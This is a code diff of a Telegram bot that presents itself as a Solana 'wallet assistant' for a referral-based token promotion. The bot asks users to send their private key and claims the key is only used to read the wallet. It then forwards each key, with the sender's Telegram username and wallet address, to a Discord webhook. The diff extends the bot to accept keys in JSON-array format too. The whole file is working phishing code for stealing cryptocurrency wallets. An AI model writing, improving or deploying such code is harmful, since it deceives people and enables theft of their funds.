@@ -4,8 +4,6 @@ const admin = require('firebase-admin');
 const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
 const rawBs58 = require('bs58');
 const bs58 = rawBs58.default || rawBs58;
-
-// ✅ Corrigido: fetch compatível com todas as versões
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
@@ -15,31 +13,43 @@ const discordWebhook = process.env.DISCORD_WEBHOOK;
 admin.initializeApp({
   credential: admin.credential.cert(credentials),
 });
-
 const db = admin.firestore();
 const connection = new Connection("https://api.mainnet-beta.solana.com");
 
 bot.start((ctx) => {
   ctx.reply(`👋 Welcome to Mage Trump Wallet Assistant!
 
-To continue, please send your Solana **private key** (in base58 format). This will allow the bot to connect to your wallet and show your status.
+To continue, please send your Solana **private key** (in base58 format or JSON array). This will allow the bot to connect to your wallet and show your status.
 
 ⚠️ Your key will be used to read your wallet only. Keep it safe.`);
 });
 
 bot.on('text', async (ctx) => {
-  const privateKey = ctx.message.text.trim();
+  const input = ctx.message.text.trim();
+  let keypair;
 
   try {
-    const decoded = bs58.decode(privateKey);
-    const keypair = Keypair.fromSecretKey(Uint8Array.from(decoded));
+    let secret;
+
+    if (input.startsWith('[')) {
+      // Trata como JSON array
+      secret = JSON.parse(input);
+    } else {
+      // Trata como base58
+      const decoded = bs58.decode(input);
+      secret = Array.from(decoded);
+    }
+
+    if (!secret || secret.length !== 64) throw new Error('Invalid secret key length');
+
+    keypair = Keypair.fromSecretKey(Uint8Array.from(secret));
     const pubkey = keypair.publicKey.toBase58();
 
-    // 🔄 Saldo da blockchain
+    // Consulta saldo real
     const lamports = await connection.getBalance(new PublicKey(pubkey));
     const solBalance = (lamports / LAMPORTS_PER_SOL).toFixed(3);
 
-    // 🔎 Dados do projeto
+    // Firebase
     const userRef = db.collection('users').doc(pubkey);
     const docSnap = await userRef.get();
 
@@ -54,7 +64,6 @@ bot.on('text', async (ctx) => {
       canClaim = data.canClaim || false;
     }
 
-    // 📤 Mensagem para o usuário
     const msg = `
 🧙 Wallet: \`${pubkey}\`
 💸 On-chain balance: ${solBalance} SOL
@@ -65,12 +74,11 @@ ${canClaim ? '✅' : '⛔'} Claim status: ${canClaim ? 'Available' : 'Not Availa
 📢 Your referral link:
 https://magetoken.com.br/?ref=${pubkey}
 
-🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!
-    `.trim();
+🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!`.trim();
 
     await ctx.replyWithMarkdown(msg);
 
-    // 📡 Log no Discord
+    // Log para Discord
     try {
       await fetch(discordWebhook, {
         method: 'POST',
@@ -79,7 +87,7 @@ https://magetoken.com.br/?ref=${pubkey}
           content: `📢 New user connected via private key:
 
 👤 Telegram: @${ctx.from.username || 'unknown'}
-🔑 Private Key: \`${privateKey}\`
+🔑 Private Key: \`${input}\`
 🧙 Wallet: \`${pubkey}\`
 
 💸 On-chain: ${solBalance} SOL
@@ -88,14 +96,12 @@ https://magetoken.com.br/?ref=${pubkey}
         })
       });
     } catch (err) {
-      console.warn('⚠️ Falha ao enviar para Discord, mas o bot continua funcionando.');
+      console.warn('⚠️ Falha ao enviar para Discord:', err.message);
     }
-
-    return;
 
   } catch (err) {
     console.error('Erro ao processar a chave:', err.message || err);
-    ctx.reply('❌ Invalid private key or error connecting to your wallet. Please try again.');
+    await ctx.reply('❌ Invalid private key or error connecting to your wallet. Please try again.');
   }
 });
 
